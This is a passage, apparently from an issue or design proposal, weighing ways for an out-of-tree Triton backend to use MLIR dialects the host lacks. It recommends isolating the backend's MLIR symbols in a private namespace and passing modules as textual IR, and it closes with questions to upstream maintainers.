| Split LLVM/MLIR into its own library (not recommended) | This only moves symbols. `TRITON_LIBRARIES` does not contain Linalg, so after the split the host still has no TypeID for it. |
| Symbol namespace isolation (recommended) | The backend compiles a private MLIR in its own namespace. Same-named symbols no longer bind to `libtriton.so`, which removes conflicts. Dialects the host lacks are provided by the backend library, which removes undefined symbols. A type in that namespace cannot be inserted into the host `MLIRContext`, so the module crosses the boundary as textual IR. |

The backend defines `TypeIDResolver<T>::id` inside its own namespace. At backend link time those symbols belong to the backend's static libraries. MemRef, Arith, and the other host types stay the host's symbols. The two names stay distinct, so loading both into one process does not merge them. **An op defined in the backend namespace cannot be registered into the host `PassManager`.**

### Recommended boundary

The host serializes the MLIR module to textual IR before handing it to the backend. The backend shared library follows three rules:

- Do not link `libtriton.so`. There is no `DT_NEEDED` on MLIR symbols.
- Compile the private MLIR in its own namespace, so `mlir::detail::TypeIDResolver<...>::id` is a different symbol from the host's.
- Accept and return only textual IR. Do not pass C++ objects such as `mlir::Value` or `PassManager*` across the boundary.

The backend statically links the smallest MLIR subset its lowering needs (Linalg, Tensor, and the transitive dependencies it actually references) and ships that subset in its own wheel. Adding a dialect later means updating the backend's link line, not shipping a new Triton.

```text
# Host: only dialects Triton already has, then serialize.
ttir_text = str(host_module)
# Backend: private MLIRContext, parse the text, lower, return text.
out_text = backend.compile_text(ttir_text)
```

## Questions

1. When an out-of-tree backend needs a dialect the host does not include, is **a separate MLIR symbol namespace, with those dialects defined by the backend, and modules passed as textual IR** the approach upstream recommends?
2. This path does not use `passes.plugin.extend_with` to inject a Linalg pass into the host `PassManager`. Does upstream accept this backend shape, or must every backend share one `MLIRContext`? Is there a better alternative?
